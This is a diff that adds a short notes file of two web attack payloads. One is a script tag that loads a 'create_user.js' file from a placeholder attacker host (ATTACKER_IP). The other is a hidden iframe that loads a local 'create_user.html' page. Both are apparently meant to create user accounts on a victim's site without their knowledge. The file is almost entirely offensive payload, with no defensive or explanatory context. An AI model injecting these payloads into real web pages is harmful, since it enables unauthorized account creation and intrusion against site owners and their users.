@@ -1,0 +1,7 @@
+#js tab based attack
+
+<script src="http://ATTACKER_IP/create_user.js"></script>
+
+#ifram based attack
+
+<iframe name="crate_user_iframe" src="http://127.0.0.1/create_user.html" style="display:none"></iframe>
